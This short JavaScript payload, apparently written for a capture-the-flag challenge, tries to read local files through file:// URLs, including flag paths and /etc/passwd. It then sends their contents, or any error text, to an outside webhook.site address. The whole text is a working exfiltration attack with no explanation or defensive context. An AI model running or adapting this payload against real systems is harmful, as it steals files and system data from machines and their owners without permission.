var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
['/flag','/flag.txt','/app/flag','/home/node/flag','/etc/passwd'].forEach(function(f){
  fetch('file://'+f).then(function(r){return r.text()}).then(function(t){
    fetch(w+'/file_'+f.replace(/\//g,'_')+'?d='+encodeURIComponent(t.substring(0,500)));
  }).catch(function(e){
    fetch(w+'/file_'+f.replace(/\//g,'_')+'_err?d='+encodeURIComponent(e+''));
  });
});
